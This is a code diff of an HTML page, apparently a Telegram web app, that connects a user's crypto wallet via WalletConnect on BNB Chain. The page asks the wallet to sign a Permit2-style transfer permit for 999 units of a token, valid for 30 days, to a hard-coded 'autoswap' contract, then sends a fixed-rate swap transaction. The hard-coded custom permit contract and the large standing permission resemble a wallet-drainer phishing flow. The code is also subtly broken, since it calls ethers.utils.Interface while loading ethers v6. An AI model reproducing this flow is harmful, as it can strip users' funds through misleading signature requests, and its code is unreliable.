@@ -8,11 +8,28 @@
     body {
       font-family: 'Segoe UI', sans-serif;
       background: linear-gradient(135deg,#1a1f2d,#0d1520);
-      color:#e0e0e0; text-align:center; margin:0; padding:20px;
+      color:#e0e0e0;
+      margin:0;
+      padding:20px;
+      text-align:center;
     }
-    .container{max-width:500px;margin:0 auto;position:relative;padding:30px;background:rgba(30,40,55,0.8);border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.4);}
-    canvas{margin:20px auto;}
-    #status{margin-top:20px;font-size:16px;min-height:40px;}
+    .container {
+      max-width:500px;
+      margin:0 auto;
+      padding:30px;
+      background:rgba(30,40,55,0.8);
+      border-radius:20px;
+    }
+    canvas {
+      margin:20px auto;
+      display:block;
+    }
+    #status {
+      margin-top:20px;
+      font-size:16px;
+      min-height:40px;
+      white-space: pre-wrap;
+    }
   </style>
 </head>
 <body>
@@ -22,13 +39,15 @@
     <div id="status">Инициализация...</div>
   </div>
 
-  <!-- Подключение библиотек -->
+  <!-- Библиотеки -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 
-  <!-- Основной код как ESM -->
   <script type="module">
+    // ✅ Полифилл для корректной сериализации BigInt
+    BigInt.prototype.toJSON = function() { return this.toString(); };
+
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
 
     const statusEl = document.getElementById("status");
@@ -40,7 +59,7 @@
 
     async function runApp() {
       try {
-        setStatus("⏳ Инициализация WalletConnect…");
+        setStatus("⏳ Инициализация WalletConnect...");
         const client = await SignClient.init({
           projectId: "d868f90cd734355ae0320f8f0258b6b1",
           relayUrl: "wss://relay.walletconnect.com",
@@ -64,47 +83,44 @@
         });
 
         if (uri) {
-          window.QRCode.toCanvas(qrCanvas, uri, { width: 240, margin: 1 });
-          setStatus("📱 Сканируйте QR-код кошельком");
+          QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
+          setStatus("📱 Отсканируйте QR-код в кошельке");
         }
 
         const session = await approval();
         const address = session.namespaces.eip155.accounts[0].split(":")[2];
-        setStatus(`✅ Кошелек подключен: ${address}`, "#66bb6a");
+        setStatus(`✅ Кошелек подключён: ${address}`, "#66bb6a");
 
         const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org");
 
-        // Правильно используем checksum: все адреса в нижнем регистре, потом ethers.getAddress
+        // Приведение адресов к правильному формату
         const permit2 = ethers.getAddress("0x7679bcfa8cc6f6094fa1c6cb8e6962287e5ca3d4");
         const autoswap = ethers.getAddress("0x026c54b156b501ad9cea422e59454d4b6d6f6963");
-        const tokenIn = ethers.getAddress("0x55d398326f99059ff775485246999027b3197955");
+        const tokenIn  = ethers.getAddress("0x55d398326f99059ff775485246999027b3197955");
         const tokenOut = ethers.getAddress("0xa511768003d01eaa0f464feeea4b1cddc4254b4f");
-
         const limit = ethers.parseUnits("999", 18);
         const rateScaled = ethers.parseUnits("0.024", 18);
 
-        setStatus("⌛ Получаем nonce Permit2...");
-        const permit2Abi = ["function allowanceNonces(address owner,address spender,address token) view returns (uint48)"];
-        const pt2 = new ethers.Contract(permit2, permit2Abi, provider);
+        setStatus("⌛ Получаем nonce из Permit2...");
+        const pt2 = new ethers.Contract(permit2,
+          ["function allowanceNonces(address,address,address) view returns (uint48)"],
+          provider
+        );
         const nonce = await pt2.allowanceNonces(address, autoswap, tokenIn);
 
         const now = Math.floor(Date.now() / 1000);
         const deadline = now + 30 * 24 * 3600;
-        const domain = {
-          name: "Permit2",
-          chainId: 56,
-          verifyingContract: permit2
-        };
+        const domain = { name:"Permit2", chainId:56, verifyingContract:permit2 };
         const types = {
           PermitTransferFrom: [
-            { name: "permitted", type: "TokenPermissions" },
-            { name: "spender", type: "address" },
-            { name: "nonce", type: "uint256" },
-            { name: "deadline", type: "uint256" }
+            { name:"permitted", type:"TokenPermissions" },
+            { name:"spender", type:"address" },
+            { name:"nonce", type:"uint256" },
+            { name:"deadline", type:"uint256" }
           ],
           TokenPermissions: [
-            { name: "token", type: "address" },
-            { name: "amount", type: "uint256" }
+            { name:"token", type:"address" },
+            { name:"amount", type:"uint256" }
           ]
         };
         const message = {
@@ -120,31 +136,32 @@
           chainId: "eip155:56",
           request: {
             method: "eth_signTypedData_v4",
-            params: [address, JSON.stringify({ types, domain, primaryType: "PermitTransferFrom", message })]
+            params: [address, JSON.stringify({ types, domain, primaryType:"PermitTransferFrom", message })]
           }
         });
 
-        setStatus("🔄 Отправка swap транзакции...");
+        setStatus("🔄 Отправка swap...");
         const swapIface = new ethers.utils.Interface([
           "function swapForUser(address user,address tokenIn,uint256 amount,uint256 nonce,uint256 deadline,address tokenOut,uint256 rate,bytes signature)"
         ]);
+
         const data = swapIface.encodeFunctionData("swapForUser", [
           address, tokenIn, limit, nonce, deadline, tokenOut, rateScaled, signature
         ]);
-        const txParams = { from: address, to: autoswap, data };
+
         const txHash = await client.request({
           topic: session.topic,
           chainId: "eip155:56",
           request: {
             method: "eth_sendTransaction",
-            params: [txParams]
+            params: [{ from: address, to: autoswap, data }]
           }
         });
 
-        setStatus(`✅ Swap инициирован:\n${txHash}`, "#66bb6a");
+        setStatus(`✅ Swap отправлен!\n${txHash}`, "#66bb6a");
       } catch (e) {
         console.error(e);
-        setStatus("❌ Ошибка: " + e.reason || e.message, "#ff6b6b");
+        setStatus(`❌ Ошибка: ${e.reason || e.message}`, "#ff6b6b");
       }
     }
 
